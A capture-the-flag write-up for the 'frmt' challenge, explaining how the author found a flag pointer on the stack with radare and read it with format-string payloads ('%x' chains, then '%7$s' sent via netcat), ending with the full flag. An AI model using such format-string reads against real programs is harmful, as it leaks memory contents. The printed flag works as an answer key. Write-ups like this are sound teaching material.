frmt
====

## Challenge info:

The flag is on the stack, but how can you get it?
Note: you'll need a text file called `flag` in the same directory as `frmt` if you're running it in your shell. This file contains the data that's put on the stack.
Connect using your CTF shell: `nc challenges.ctfd.io 30277`

## Solution:

The name of the challenge suggested exploiting a [format string vulnerability](https://medium.com/@nikhilh20/format-string-exploit-ccefad8fd66b) would be necessary to obtain the flag, so that's what I focused my efforts on.

I created a file called `test` with data where, if it ever appeared on screen, meant I had solved the challenge; then I loaded the program into the reverse engineering tool radare which was available in the CTF shell (but required lib32z1 to be installed before the program would run). I won't cover how radare works in this writeup as this was the first time I had seriously tried it and am still not that confident using it, but I would use the default visual mode which gave me a view of the disassembled code, the stack and current register values.

Stepping through the code, I saw the `main()` function loaded the contents of `flag` into memory, then stored a pointer to that memory on the stack before calling `frmt()`, which asks for input before returning the given input with `printf()`. When looking at the program running in radare, I could see that pointer and the only question was how far away was the pointer from where `printf()` was expecting its arguments. At this point I sent a long string of `%x` characters to look at as much data on the stack as I could and try to find the pointer, which I managed to do.

```
$ python -c 'print("%x " * 11)' | ./frmt 
hey what's up?
You gave me:
88f267e3 88f278c0 88c4a264 c 0 10001 f47d4480 25207825 20782520 78252078 25207825
                                     ^- this value is the pointer to the flag
```
Once I had located the pointer in memory, all that was left was to pass a format string that referenced it and retrieve the flag:
```
$ echo '%7$s' | nc challenges.ctfd.io 30277
hey what's up?
You gave me:
Equifax{format_string_vulns_are_bad_news_and_can_lead_to_remote_code_execution_but_this_challenge_didnt_test_it_but_there_might_be_a_future_challenge_that_does_and_this_is_a_long_flag.probably_the_longest_of_any_of_the_other_challenges_in_this_ctf.good_job_4c05f22}
```
